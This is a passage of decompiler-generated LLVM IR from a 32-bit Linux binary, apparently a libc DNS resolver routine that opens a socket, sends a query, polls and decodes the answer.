  %v1_804c28b = phi i32 [ %v1_804c288, %dec_label_pc_804c26b ], [ %v0_804c275, %dec_label_pc_804c254 ]
  %v0_804c28b = load i32, i32* @ecx, align 4
  %v2_804c28b = add i32 %v1_804c28b, -4
  %v3_804c28b = inttoptr i32 %v2_804c28b to i32*
  store i32 %v0_804c28b, i32* %v3_804c28b, align 4
  %v1_804c28c = add i32 %v1_804c28b, -8
  %v2_804c28c = inttoptr i32 %v1_804c28c to i32*
  store i32 17, i32* %v2_804c28c, align 4
  %v1_804c28e = add i32 %v1_804c28b, -12
  %v2_804c28e = inttoptr i32 %v1_804c28e to i32*
  store i32 2, i32* %v2_804c28e, align 4
  %v1_804c290 = add i32 %v1_804c28b, 156
  %v2_804c290 = inttoptr i32 %v1_804c290 to i16*
  %v3_804c290 = load i16, i16* %v2_804c290, align 2
  %v4_804c290 = zext i16 %v3_804c290 to i32
  store i32 %v4_804c290, i32* %eax.global-to-local, align 4
  %v2_804c298 = add i32 %v1_804c28b, -16
  %v3_804c298 = inttoptr i32 %v2_804c298 to i32*
  store i32 %v4_804c290, i32* %v3_804c298, align 4
  %v3_804c299 = call i32 @socket(i32 -1, i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c299, i32* %eax.global-to-local, align 4
  %v1_804c29e = load i32, i32* @esp, align 4
  %v2_804c29e = add i32 %v1_804c29e, 36
  %v3_804c29e = inttoptr i32 %v2_804c29e to i32*
  store i32 %v3_804c299, i32* %v3_804c29e, align 4
  %v0_804c2a2 = load i32, i32* @esp, align 4
  %v1_804c2a2 = add i32 %v0_804c2a2, 16
  %v0_804c2a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2a5 = icmp slt i32 %v0_804c2a5, 0
  br i1 %v2_804c2a5, label %dec_label_pc_804c2d2, label %dec_label_pc_804c2a9

dec_label_pc_804c2a9:                             ; preds = %dec_label_pc_804c28b
  %v1_804c2a9 = add i32 %v0_804c2a2, 172
  store i32 %v1_804c2a9, i32* %eax.global-to-local, align 4
  %v0_804c2b0 = load i32, i32* @edx, align 4
  %v2_804c2b0 = add i32 %v0_804c2a2, 12
  %v3_804c2b0 = inttoptr i32 %v2_804c2b0 to i32*
  store i32 %v0_804c2b0, i32* %v3_804c2b0, align 4
  %v1_804c2b1 = add i32 %v0_804c2a2, 8
  %v2_804c2b1 = inttoptr i32 %v1_804c2b1 to i32*
  store i32 28, i32* %v2_804c2b1, align 4
  %v0_804c2b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2b3 = add i32 %v0_804c2a2, 4
  %v3_804c2b3 = inttoptr i32 %v2_804c2b3 to i32*
  store i32 %v0_804c2b3, i32* %v3_804c2b3, align 4
  %v1_804c2b4 = add i32 %v0_804c2a2, 36
  %v2_804c2b4 = inttoptr i32 %v1_804c2b4 to i32*
  %v3_804c2b4 = load i32, i32* %v2_804c2b4, align 4
  %v6_804c2b4 = inttoptr i32 %v0_804c2a2 to i32*
  store i32 %v3_804c2b4, i32* %v6_804c2b4, align 4
  %v3_804c2b8 = call i32 @__libc_connect(i32 -1, i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c2b8, i32* %eax.global-to-local, align 4
  %v0_804c2bd = load i32, i32* @esp, align 4
  %v2_804c2c0 = icmp slt i32 %v3_804c2b8, 0
  %v1_804c2c2 = icmp eq i1 %v2_804c2c0, false
  br i1 %v1_804c2c2, label %dec_label_pc_804c2db, label %dec_label_pc_804c2c4

dec_label_pc_804c2c4:                             ; preds = %dec_label_pc_804c2a9
  %v1_804c2c4 = call i32 @__errno_location(i32 -1)
  store i32 %v1_804c2c4, i32* %eax.global-to-local, align 4
  %v1_804c2c9 = inttoptr i32 %v1_804c2c4 to i32*
  %v2_804c2c9 = load i32, i32* %v1_804c2c9, align 4
  %v11_804c2c9 = icmp eq i32 %v2_804c2c9, 101
  %v0_804c63b.pre = load i32, i32* @esp, align 4
  br i1 %v11_804c2c9, label %dec_label_pc_804c63b, label %dec_label_pc_804c2d2

dec_label_pc_804c2d2:                             ; preds = %dec_label_pc_804c2c4, %dec_label_pc_804c28b
  %v17_804c2d2 = phi i32 [ %v1_804c2a2, %dec_label_pc_804c28b ], [ %v0_804c63b.pre, %dec_label_pc_804c2c4 ]
  %v1_804c2d2 = add i32 %v17_804c2d2, 28
  %v2_804c2d2 = inttoptr i32 %v1_804c2d2 to i32*
  %v3_804c2d2 = load i32, i32* %v2_804c2d2, align 4
  %v4_804c2d2 = add i32 %v3_804c2d2, 1
  store i32 %v4_804c2d2, i32* %v2_804c2d2, align 4
  br label %dec_label_pc_804c65c.backedge

dec_label_pc_804c2db:                             ; preds = %dec_label_pc_804c2a9
  %v1_804c2db = add i32 %v0_804c2bd, 12
  %v2_804c2db = inttoptr i32 %v1_804c2db to i32*
  store i32 0, i32* %v2_804c2db, align 4
  %v0_804c2dd = load i32, i32* @ebx, align 4
  %v1_804c2dd = load i32, i32* @esi, align 4
  %v2_804c2dd = add i32 %v1_804c2dd, %v0_804c2dd
  store i32 %v2_804c2dd, i32* %eax.global-to-local, align 4
  %v2_804c2e0 = add i32 %v0_804c2bd, 8
  %v3_804c2e0 = inttoptr i32 %v2_804c2e0 to i32*
  store i32 %v2_804c2dd, i32* %v3_804c2e0, align 4
  %v2_804c2e1 = add i32 %v0_804c2bd, 4
  %v3_804c2e1 = inttoptr i32 %v2_804c2e1 to i32*
  store i32 %v2_804bfee, i32* %v3_804c2e1, align 4
  %v1_804c2e2 = add i32 %v0_804c2bd, 36
  %v2_804c2e2 = inttoptr i32 %v1_804c2e2 to i32*
  %v3_804c2e2 = load i32, i32* %v2_804c2e2, align 4
  %v6_804c2e2 = inttoptr i32 %v0_804c2bd to i32*
  store i32 %v3_804c2e2, i32* %v6_804c2e2, align 4
  %v4_804c2e6 = call i32 @__libc_send(i32 -1, i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c2e6, i32* %eax.global-to-local, align 4
  %v0_804c2eb = load i32, i32* @esp, align 4
  %v1_804c2eb = add i32 %v0_804c2eb, 36
  %v2_804c2eb = inttoptr i32 %v1_804c2eb to i32*
  %v3_804c2eb = load i32, i32* %v2_804c2eb, align 4
  store i32 %v3_804c2eb, i32* %eax.global-to-local, align 4
  %v1_804c2ef = add i32 %v0_804c2eb, 232
  %v2_804c2ef = inttoptr i32 %v1_804c2ef to i16*
  store i16 1, i16* %v2_804c2ef, align 2
  %v0_804c2f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c2f9 = load i32, i32* @esp, align 4
  %v2_804c2f9 = add i32 %v1_804c2f9, 228
  %v3_804c2f9 = inttoptr i32 %v2_804c2f9 to i32*
  store i32 %v0_804c2f9, i32* %v3_804c2f9, align 4
  %v0_804c300 = load i32, i32* @esp, align 4
  %v1_804c303 = add i32 %v0_804c300, 8
  %v2_804c303 = inttoptr i32 %v1_804c303 to i32*
  store i32 10000, i32* %v2_804c303, align 4
  %v1_804c308 = add i32 %v0_804c300, 4
  %v2_804c308 = inttoptr i32 %v1_804c308 to i32*
  store i32 1, i32* %v2_804c308, align 4
  %v1_804c30a = add i32 %v0_804c300, 228
  store i32 %v1_804c30a, i32* %eax.global-to-local, align 4
  %v3_804c311 = inttoptr i32 %v0_804c300 to i32*
  store i32 %v1_804c30a, i32* %v3_804c311, align 4
  %v0_804c312 = call i32 @__libc_poll()
  store i32 %v0_804c312, i32* %eax.global-to-local, align 4
  %v0_804c317 = load i32, i32* @esp, align 4
  %v1_804c317 = add i32 %v0_804c317, 16
  %tmp48 = icmp slt i32 %v0_804c312, 1
  br i1 %tmp48, label %dec_label_pc_804c63b, label %dec_label_pc_804c322

dec_label_pc_804c322:                             ; preds = %dec_label_pc_804c2db
  %v1_804c322 = add i32 %v0_804c317, 12
  %v2_804c322 = inttoptr i32 %v1_804c322 to i32*
  store i32 0, i32* %v2_804c322, align 4
  %v1_804c324 = add i32 %v0_804c317, 8
  %v2_804c324 = inttoptr i32 %v1_804c324 to i32*
  store i32 512, i32* %v2_804c324, align 4
  %v2_804c329 = add i32 %v0_804c317, 4
  %v3_804c329 = inttoptr i32 %v2_804c329 to i32*
  store i32 %v2_804bfee, i32* %v3_804c329, align 4
  %v1_804c32a = add i32 %v0_804c317, 36
  %v2_804c32a = inttoptr i32 %v1_804c32a to i32*
  %v3_804c32a = load i32, i32* %v2_804c32a, align 4
  %v6_804c32a = inttoptr i32 %v0_804c317 to i32*
  store i32 %v3_804c32a, i32* %v6_804c32a, align 4
  %v4_804c32e = call i32 @__libc_recv(i32 -1, i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c32e, i32* @eax, align 4
  %v1_804c333 = load i32, i32* @esp, align 4
  %v2_804c333 = add i32 %v1_804c333, 32
  %v3_804c333 = inttoptr i32 %v2_804c333 to i32*
  store i32 %v4_804c32e, i32* %v3_804c333, align 4
  %v0_804c337 = load i32, i32* @esp, align 4
  %v1_804c337 = add i32 %v0_804c337, 16
  %v7_804c33d = icmp sgt i32 %v4_804c32e, 11
  br i1 %v7_804c33d, label %dec_label_pc_804c343, label %dec_label_pc_804c5f0

dec_label_pc_804c343:                             ; preds = %dec_label_pc_804c322
  %v0_804c343 = load i32, i32* @ebx, align 4
  %v2_804c343 = add i32 %v0_804c337, 12
  %v3_804c343 = inttoptr i32 %v2_804c343 to i32*
  store i32 %v0_804c343, i32* %v3_804c343, align 4
  %v0_804c344 = load i32, i32* @ebx, align 4
  %v2_804c344 = add i32 %v0_804c337, 8
  %v3_804c344 = inttoptr i32 %v2_804c344 to i32*
  store i32 %v0_804c344, i32* %v3_804c344, align 4
  %v1_804c345 = add i32 %v0_804c337, 84
  store i32 %v1_804c345, i32* %eax.global-to-local, align 4
  %v2_804c349 = add i32 %v0_804c337, 4
  %v3_804c349 = inttoptr i32 %v2_804c349 to i32*
  store i32 %v1_804c345, i32* %v3_804c349, align 4
  %v3_804c34a = inttoptr i32 %v0_804c337 to i32*
  store i32 %v2_804bfee, i32* %v3_804c34a, align 4
  %v0_804c34b = call i32 @__decode_header()
  store i32 %v0_804c34b, i32* %eax.global-to-local, align 4
  %v0_804c350 = load i32, i32* @esp, align 4
  %v1_804c350 = add i32 %v0_804c350, 84
  %v2_804c350 = inttoptr i32 %v1_804c350 to i32*
  %v3_804c350 = load i32, i32* %v2_804c350, align 4
  store i32 %v3_804c350, i32* %edx.global-to-local, align 4
  %v2_804c354 = add i32 %v0_804c350, 60
  %v3_804c354 = inttoptr i32 %v2_804c354 to i32*
  store i32 %v3_804c350, i32* %v3_804c354, align 4
  %v0_804c358 = load i32, i32* @esp, align 4
  %v1_804c358 = add i32 %v0_804c358, 16
  %v1_804c35b = add i32 %v0_804c358, 72
  %v2_804c35b = inttoptr i32 %v1_804c35b to i32*
  %v3_804c35b = load i32, i32* %v2_804c35b, align 4
  store i32 %v3_804c35b, i32* @eax, align 4
  %v0_804c35f = load i32, i32* %edx.global-to-local, align 4
  %v12_804c35f = icmp eq i32 %v0_804c35f, %v3_804c35b
  %v1_804c361 = icmp eq i1 %v12_804c35f, false
  br i1 %v1_804c361, label %dec_label_pc_804c5f0, label %dec_label_pc_804c367

dec_label_pc_804c367:                             ; preds = %dec_label_pc_804c343
  %v1_804c367 = add i32 %v0_804c358, 88
  %v2_804c367 = inttoptr i32 %v1_804c367 to i32*
  %v3_804c367 = load i32, i32* %v2_804c367, align 4
  %v4_804c367 = icmp eq i32 %v3_804c367, 0
  br i1 %v4_804c367, label %dec_label_pc_804c5f0, label %dec_label_pc_804c372

dec_label_pc_804c372:                             ; preds = %dec_label_pc_804c367
  %v1_804c372 = add i32 %v0_804c358, 112
  %v2_804c372 = inttoptr i32 %v1_804c372 to i32*
  %v3_804c372 = load i32, i32* %v2_804c372, align 4
  store i32 %v3_804c372, i32* @eax, align 4
  %v9_804c376 = icmp eq i32 %v3_804c372, 3
  %v1_804c379 = icmp eq i1 %v9_804c376, false
  br i1 %v1_804c379, label %dec_label_pc_804c3e1, label %dec_label_pc_804c37b

dec_label_pc_804c37b:                             ; preds = %dec_label_pc_804c372
  %v1_804c37b = add i32 %v0_804c358, 67
  %v2_804c37b = inttoptr i32 %v1_804c37b to i8*
  %v3_804c37b = load i8, i8* %v2_804c37b, align 1
  %v4_804c37b = icmp eq i8 %v3_804c37b, 0
  %v1_804c380 = icmp eq i1 %v4_804c37b, false
  br i1 %v1_804c380, label %dec_label_pc_804c3d1, label %dec_label_pc_804c382

dec_label_pc_804c382:                             ; preds = %dec_label_pc_804c37b
  %v0_804c382 = load i32, i32* @ecx, align 4
  %v2_804c382 = add i32 %v0_804c358, 12
  %v3_804c382 = inttoptr i32 %v2_804c382 to i32*
  store i32 %v0_804c382, i32* %v3_804c382, align 4
  %v1_804c383 = add i32 %v0_804c358, 8
  %v2_804c383 = inttoptr i32 %v1_804c383 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c383, align 4
  %v1_804c388 = add i32 %v0_804c358, 4
  %v2_804c388 = inttoptr i32 %v1_804c388 to i32*
  store i32 134526883, i32* %v2_804c388, align 4
  %v1_804c38d = add i32 %v0_804c358, 200
  store i32 %v1_804c38d, i32* @esi, align 4
  %v3_804c394 = inttoptr i32 %v0_804c358 to i32*
  store i32 %v1_804c38d, i32* %v3_804c394, align 4
  %v2_804c395 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c395, i32* %eax.global-to-local, align 4
  %v0_804c39a = load i32, i32* @esp, align 4
  %v1_804c39a = inttoptr i32 %v0_804c39a to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c39a, align 4
  %v1_804c3a1 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c3a1, i32* %eax.global-to-local, align 4
  %v0_804c3a6 = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c3a6, i32* %ebx.global-to-local, align 4
  %v0_804c3ac = load i32, i32* @esp, align 4
  %v1_804c3ac = inttoptr i32 %v0_804c3ac to i32*
  %v2_804c3ac = load i32, i32* %v1_804c3ac, align 4
  store i32 %v2_804c3ac, i32* @eax, align 4
  %v3_804c3ac = add i32 %v0_804c3ac, 4
  %v1_804c3ad = inttoptr i32 %v3_804c3ac to i32*
  %v2_804c3ad = load i32, i32* %v1_804c3ad, align 4
  store i32 %v2_804c3ad, i32* %edx.global-to-local, align 4
  %v1_804c3ae = add i32 %v0_804c3a6, -1
  store i32 %v1_804c3ae, i32* @ebx, align 4
  store i32 1, i32* %v1_804c3ad, align 4
  %v0_804c3b1 = load i32, i32* @esi, align 4
  store i32 %v0_804c3b1, i32* %v1_804c3ac, align 4
  %v2_804c3b2 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c3b2, i32* %eax.global-to-local, align 4
  %v0_804c3b7 = load i32, i32* @esp, align 4
  %v1_804c3ba = add i32 %v0_804c3b7, 52
  %v2_804c3ba = inttoptr i32 %v1_804c3ba to i32*
  %v3_804c3ba = load i32, i32* %v2_804c3ba, align 4
  %v4_804c3ba = load i32, i32* @ebx, align 4
  %v5_804c3ba = sub i32 %v3_804c3ba, %v4_804c3ba
  %v11_804c3ba = xor i32 %v4_804c3ba, %v3_804c3ba
  %v12_804c3ba = xor i32 %v5_804c3ba, %v3_804c3ba
  %v13_804c3ba = and i32 %v12_804c3ba, %v11_804c3ba
  %v14_804c3ba = icmp slt i32 %v13_804c3ba, 0
  %v16_804c3ba = icmp slt i32 %v5_804c3ba, 0
  %v2_804c3be = icmp eq i1 %v16_804c3ba, %v14_804c3ba
  br i1 %v2_804c3be, label %dec_label_pc_804c3d1, label %dec_label_pc_804c3c0

dec_label_pc_804c3c0:                             ; preds = %dec_label_pc_804c382
  %v1_804c3c0 = add i32 %v0_804c3b7, 60
  %v2_804c3c0 = inttoptr i32 %v1_804c3c0 to i32*
  %v3_804c3c0 = load i32, i32* %v2_804c3c0, align 4
  store i32 %v3_804c3c0, i32* %edx.global-to-local, align 4
  %v3_804c3c4 = load i32, i32* %v2_804c3ba, align 4
  %v4_804c3c4 = add i32 %v3_804c3c4, 1
  store i32 %v4_804c3c4, i32* %v2_804c3ba, align 4
  %v0_804c3c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3c8 = load i32, i32* @esp, align 4
  %v2_804c3c8 = add i32 %v1_804c3c8, 56
  %v3_804c3c8 = inttoptr i32 %v2_804c3c8 to i32*
  store i32 %v0_804c3c8, i32* %v3_804c3c8, align 4
  br label %dec_label_pc_804c65c.backedge

dec_label_pc_804c3d1:                             ; preds = %dec_label_pc_804c382, %dec_label_pc_804c37b
  %v0_804c3d1 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c3d1, i32* %eax.global-to-local, align 4
  %v1_804c3d6 = inttoptr i32 %v0_804c3d1 to i32*
  store i32 1, i32* %v1_804c3d6, align 4
  br label %dec_label_pc_804c694

dec_label_pc_804c3e1:                             ; preds = %dec_label_pc_804c372
  %v1_804c3e1 = icmp eq i32 %v3_804c372, 0
  %v1_804c3e3 = icmp eq i1 %v1_804c3e1, false
  br i1 %v1_804c3e3, label %dec_label_pc_804c5f0, label %dec_label_pc_804c3e9

dec_label_pc_804c3e9:                             ; preds = %dec_label_pc_804c3e1
  %v1_804c3e9 = add i32 %v0_804c358, 120
  %v2_804c3e9 = inttoptr i32 %v1_804c3e9 to i32*
  %v3_804c3e9 = load i32, i32* %v2_804c3e9, align 4
  %tmp49 = icmp slt i32 %v3_804c3e9, 1
  br i1 %tmp49, label %dec_label_pc_804c3f9, label %dec_label_pc_804c3f0

dec_label_pc_804c3f0:                             ; preds = %dec_label_pc_804c3e9
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_804c41855 = add i32 %v0_804c358, 116
  %v3_804c41856 = inttoptr i32 %v2_804c41855 to i32*
  %v4_804c41857 = load i32, i32* %v3_804c41856, align 4
  %v5_804c41858 = sub i32 0, %v4_804c41857
  %v13_804c41862 = and i32 %v4_804c41857, %v5_804c41858
  %v14_804c41863 = icmp slt i32 %v13_804c41862, 0
  %v16_804c41865 = icmp slt i32 %v5_804c41858, 0
  %v2_804c41c66 = icmp eq i1 %v16_804c41865, %v14_804c41863
  br i1 %v2_804c41c66, label %dec_label_pc_804c41e, label %dec_label_pc_804c409

dec_label_pc_804c3f9:                             ; preds = %dec_label_pc_804c3e9
  %v0_804c3f9 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c3f9, i32* %eax.global-to-local, align 4
  %v1_804c3fe = inttoptr i32 %v0_804c3f9 to i32*
  store i32 4, i32* %v1_804c3fe, align 4
  br label %dec_label_pc_804c694

dec_label_pc_804c409:                             ; preds = %dec_label_pc_804c3f0, %dec_label_pc_804c409
  %v0_804c42068 = phi i32 [ %v1_804c413, %dec_label_pc_804c409 ], [ %v1_804c358, %dec_label_pc_804c3f0 ]
  %v0_804c40967 = phi i32 [ %v0_804c40e, %dec_label_pc_804c409 ], [ %v3_804c372, %dec_label_pc_804c3f0 ]
  %v2_804c409 = add i32 %v0_804c42068, -4
  %v3_804c409 = inttoptr i32 %v2_804c409 to i32*
  store i32 %v0_804c40967, i32* %v3_804c409, align 4
  %v0_804c40a = load i32, i32* @ebx, align 4
  %v1_804c40a = add i32 %v0_804c40a, 1
  store i32 %v1_804c40a, i32* @ebx, align 4
  %v0_804c40b = load i32, i32* @eax, align 4
  %v2_804c40b = add i32 %v0_804c42068, -8
  %v3_804c40b = inttoptr i32 %v2_804c40b to i32*
  store i32 %v0_804c40b, i32* %v3_804c40b, align 4
  %v0_804c40c = load i32, i32* @esi, align 4
  %v2_804c40c = add i32 %v0_804c42068, -12
  %v3_804c40c = inttoptr i32 %v2_804c40c to i32*
  store i32 %v0_804c40c, i32* %v3_804c40c, align 4
  %v2_804c40d = add i32 %v0_804c42068, -16
  %v3_804c40d = inttoptr i32 %v2_804c40d to i32*
  store i32 %v2_804bfee, i32* %v3_804c40d, align 4
  %v0_804c40e = call i32 @__length_question()
  store i32 %v0_804c40e, i32* @eax, align 4
  %v0_804c413 = load i32, i32* @esp, align 4
  %v1_804c413 = add i32 %v0_804c413, 16
  %v0_804c416 = load i32, i32* @esi, align 4
  %v2_804c416 = add i32 %v0_804c416, %v0_804c40e
  %v0_804c418.pre = load i32, i32* @ebx, align 4
  store i32 %v2_804c416, i32* @esi, align 4
  %v2_804c418 = add i32 %v0_804c413, 116
  %v3_804c418 = inttoptr i32 %v2_804c418 to i32*
  %v4_804c418 = load i32, i32* %v3_804c418, align 4
  %v5_804c418 = sub i32 %v0_804c418.pre, %v4_804c418
  %v11_804c418 = xor i32 %v4_804c418, %v0_804c418.pre
  %v12_804c418 = xor i32 %v5_804c418, %v0_804c418.pre
  %v13_804c418 = and i32 %v12_804c418, %v11_804c418
  %v14_804c418 = icmp slt i32 %v13_804c418, 0
  %v16_804c418 = icmp slt i32 %v5_804c418, 0
  %v2_804c41c = icmp eq i1 %v16_804c418, %v14_804c418
  br i1 %v2_804c41c, label %dec_label_pc_804c41e, label %dec_label_pc_804c409

dec_label_pc_804c41e:                             ; preds = %dec_label_pc_804c409, %dec_label_pc_804c3f0
  %v0_804c420.lcssa = phi i32 [ %v1_804c358, %dec_label_pc_804c3f0 ], [ %v1_804c413, %dec_label_pc_804c409 ]
  store i32 0, i32* @ebx, align 4
  %v1_804c420 = add i32 %v0_804c420.lcssa, 27
  %v2_804c420 = inttoptr i32 %v1_804c420 to i8*
  store i8 1, i8* %v2_804c420, align 1
  %v0_804c54e.pre = load i32, i32* @ebx, align 4
  %v1_804c54e.pre = load i32, i32* @esp, align 4
  %v2_804c54e69 = add i32 %v1_804c54e.pre, 104
  %v3_804c54e70 = inttoptr i32 %v2_804c54e69 to i32*
  %v4_804c54e71 = load i32, i32* %v3_804c54e70, align 4
  %v5_804c54e72 = sub i32 %v0_804c54e.pre, %v4_804c54e71
  %v11_804c54e74 = xor i32 %v4_804c54e71, %v0_804c54e.pre
  %v12_804c54e75 = xor i32 %v5_804c54e72, %v0_804c54e.pre
  %v13_804c54e76 = and i32 %v12_804c54e75, %v11_804c54e74
  %v14_804c54e77 = icmp slt i32 %v13_804c54e76, 0
  %v16_804c54e79 = icmp slt i32 %v5_804c54e72, 0
  %v2_804c55280 = icmp eq i1 %v16_804c54e79, %v14_804c54e77
  br i1 %v2_804c55280, label %dec_label_pc_804c55e, label %dec_label_pc_804c554.lr.ph

dec_label_pc_804c554.lr.ph:                       ; preds = %dec_label_pc_804c41e
  %v0_804c554.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c554

dec_label_pc_804c42a:                             ; preds = %dec_label_pc_804c554
  %v1_804c42a = add i32 %v0_804c42a81, 116
  store i32 %v1_804c42a, i32* %eax.global-to-local, align 4
  %v2_804c42e = add i32 %v0_804c42a81, -4
  %v3_804c42e = inttoptr i32 %v2_804c42e to i32*
  store i32 %v1_804c42a, i32* %v3_804c42e, align 4
  %v3_804c42f = load i32, i32* %v3_804c554, align 4
  %v5_804c42f = add i32 %v0_804c42a81, -8
  %v6_804c42f = inttoptr i32 %v5_804c42f to i32*
  store i32 %v3_804c42f, i32* %v6_804c42f, align 4
  %v0_804c433 = load i32, i32* @esi, align 4
  %v2_804c433 = add i32 %v0_804c42a81, -12
  %v3_804c433 = inttoptr i32 %v2_804c433 to i32*
  store i32 %v0_804c433, i32* %v3_804c433, align 4
  %v2_804c434 = add i32 %v0_804c42a81, -16
  %v3_804c434 = inttoptr i32 %v2_804c434 to i32*
  store i32 %v2_804bfee, i32* %v3_804c434, align 4
  %v0_804c435 = call i32 @__decode_answer()
  store i32 %v0_804c435, i32* @eax, align 4
  %v1_804c43a = load i32, i32* @esp, align 4
  %v2_804c43a = add i32 %v1_804c43a, 68
  %v3_804c43a = inttoptr i32 %v2_804c43a to i32*
  store i32 %v0_804c435, i32* %v3_804c43a, align 4
  %v0_804c43e = load i32, i32* @esp, align 4
  %v1_804c43e = add i32 %v0_804c43e, 16
  %v2_804c441 = icmp slt i32 %v0_804c435, 0
  %v1_804c443 = icmp eq i1 %v2_804c441, false
  br i1 %v1_804c443, label %dec_label_pc_804c45d, label %dec_label_pc_804c445

dec_label_pc_804c445:                             ; preds = %dec_label_pc_804c42a
  %v0_804c445 = load i32, i32* @ebx, align 4
  %v1_804c445 = icmp eq i32 %v0_804c445, 0
  br i1 %v1_804c445, label %dec_label_pc_804c5f0, label %dec_label_pc_804c44d

dec_label_pc_804c44d:                             ; preds = %dec_label_pc_804c445
  %v1_804c44d = add i32 %v0_804c43e, 100
  %v2_804c44d = inttoptr i32 %v1_804c44d to i32*
  %v3_804c44d = load i32, i32* %v2_804c44d, align 4
  %v4_804c44d = icmp eq i32 %v3_804c44d, 0
  br i1 %v4_804c44d, label %dec_label_pc_804c5f0, label %dec_label_pc_804c55e

dec_label_pc_804c45d:                             ; preds = %dec_label_pc_804c42a
  %v1_804c45d = add i32 %v0_804c43e, 43
  %v2_804c45d = inttoptr i32 %v1_804c45d to i8*
  %v3_804c45d = load i8, i8* %v2_804c45d, align 1
  %v4_804c45d = icmp eq i8 %v3_804c45d, 0
  br i1 %v4_804c45d, label %dec_label_pc_804c4fe, label %dec_label_pc_804c468

dec_label_pc_804c468:                             ; preds = %dec_label_pc_804c45d
  %v0_804c468 = load i32, i32* @edi, align 4
  %v1_804c468 = add i32 %v0_804c468, 28
  %v2_804c468 = inttoptr i32 %v1_804c468 to i32*
  %v3_804c468 = load i32, i32* %v2_804c468, align 4
  store i32 %v3_804c468, i32* %eax.global-to-local, align 4
  %v2_804c46b = add i32 %v0_804c43e, 160
  %v3_804c46b = inttoptr i32 %v2_804c46b to i32*
  store i32 %v3_804c468, i32* %v3_804c46b, align 4
  %v0_804c472 = load i32, i32* @edi, align 4
  %v1_804c472 = add i32 %v0_804c472, 32
  %v2_804c472 = inttoptr i32 %v1_804c472 to i32*
  %v3_804c472 = load i32, i32* %v2_804c472, align 4
  store i32 %v3_804c472, i32* %eax.global-to-local, align 4
  %v1_804c475 = load i32, i32* @esp, align 4
  %v2_804c475 = add i32 %v1_804c475, 148
  %v3_804c475 = inttoptr i32 %v2_804c475 to i32*
  store i32 %v3_804c472, i32* %v3_804c475, align 4
  %v0_804c47c = load i32, i32* @edi, align 4
  %v1_804c47c = add i32 %v0_804c47c, 36
  %v2_804c47c = inttoptr i32 %v1_804c47c to i32*
  %v3_804c47c = load i32, i32* %v2_804c47c, align 4
  store i32 %v3_804c47c, i32* %eax.global-to-local, align 4
  %v1_804c47f = load i32, i32* @esp, align 4
  %v2_804c47f = add i32 %v1_804c47f, 152
  %v3_804c47f = inttoptr i32 %v2_804c47f to i32*
  store i32 %v3_804c47c, i32* %v3_804c47f, align 4
  %v0_804c486 = load i32, i32* @ecx, align 4
  %v1_804c486 = load i32, i32* @esp, align 4
  %v2_804c486 = add i32 %v1_804c486, -4
  %v3_804c486 = inttoptr i32 %v2_804c486 to i32*
  store i32 %v0_804c486, i32* %v3_804c486, align 4
  %v1_804c487 = add i32 %v1_804c486, -8
  %v2_804c487 = inttoptr i32 %v1_804c487 to i32*
  store i32 40, i32* %v2_804c487, align 4
  %v1_804c489 = add i32 %v1_804c486, 116
  store i32 %v1_804c489, i32* %edx.global-to-local, align 4
  %v2_804c48d = add i32 %v1_804c486, -12
  %v3_804c48d = inttoptr i32 %v2_804c48d to i32*
  store i32 %v1_804c489, i32* %v3_804c48d, align 4
  %v0_804c48e = load i32, i32* @edi, align 4
  %v2_804c48e = add i32 %v1_804c486, -16
  %v3_804c48e = inttoptr i32 %v2_804c48e to i32*
  store i32 %v0_804c48e, i32* %v3_804c48e, align 4
  %v4_804c48f = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c48f, i32* %eax.global-to-local, align 4
  %v0_804c494 = load i32, i32* @edi, align 4
  %v1_804c494 = add i32 %v0_804c494, 4
  %v2_804c494 = inttoptr i32 %v1_804c494 to i32*
  %v3_804c494 = load i32, i32* %v2_804c494, align 4
  store i32 %v3_804c494, i32* %eax.global-to-local, align 4
  %v0_804c497 = load i32, i32* @esp, align 4
  %v1_804c497 = add i32 %v0_804c497, 16
  %v9_804c49a = icmp eq i32 %v3_804c494, 24
  br i1 %v9_804c49a, label %dec_label_pc_804c468.dec_label_pc_804c4c1_crit_edge, label %dec_label_pc_804c49f

dec_label_pc_804c468.dec_label_pc_804c4c1_crit_edge: ; preds = %dec_label_pc_804c468
  %.pre24 = add i32 %v0_804c497, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_804c4c1.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_804c4c1

dec_label_pc_804c49f:                             ; preds = %dec_label_pc_804c468
  %v1_804c49f = add i32 %v0_804c494, 28
  %v2_804c49f = inttoptr i32 %v1_804c49f to i32*
  %v3_804c49f = load i32, i32* %v2_804c49f, align 4
  %v4_804c49f = icmp eq i32 %v3_804c49f, 0
  br i1 %v4_804c49f, label %dec_label_pc_804c55e, label %dec_label_pc_804c4a9

dec_label_pc_804c4a9:                             ; preds = %dec_label_pc_804c49f
  %v1_804c4a9 = add i32 %v0_804c497, 260
  %v2_804c4a9 = inttoptr i32 %v1_804c4a9 to i32*
  %v3_804c4a9 = load i32, i32* %v2_804c4a9, align 4
  %v12_804c4a9 = icmp eq i32 %v3_804c4a9, 1
  br i1 %v12_804c4a9, label %dec_label_pc_804c4c1, label %dec_label_pc_804c4b3

dec_label_pc_804c4b3:                             ; preds = %dec_label_pc_804c4a9
